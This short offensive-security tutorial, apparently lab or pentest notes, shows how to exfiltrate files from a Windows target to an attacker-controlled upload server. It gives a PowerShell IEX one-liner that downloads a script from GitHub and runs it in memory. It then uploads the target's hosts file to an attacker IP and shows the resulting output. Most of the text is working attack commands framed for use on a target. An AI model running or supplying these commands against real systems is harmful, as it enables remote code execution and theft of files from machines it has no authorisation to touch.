
## 1. Set Up an Upload Server (Attacker Machine)

Use Python’s **`uploadserver`** module.

### Install the module:

```bash
pip3 install uploadserver
```

### Start the upload server:

```bash
python3 -m uploadserver
```

The server will start on port **8000**.  
Uploads will be accepted at:

```
http://<attacker_ip>:8000/upload
```

---

## 2. Load the PSUpload Script (Target Machine)

On the **Windows target**, download the script into memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

This loads the **`Invoke-FileUpload`** function into your PowerShell session.

---

## 3. Upload the File (Target Machine)

Now you can upload any file to the attacker’s server. For example, to upload the `hosts` file:

```powershell
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

### Example Output:

```
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

---

## Tips

- Always confirm the **IP and port** match your attacker server.
    
- Use `https://` with a trusted certificate if operating in secure environments.
    
- Verify the file hash after upload to ensure integrity.
    

---
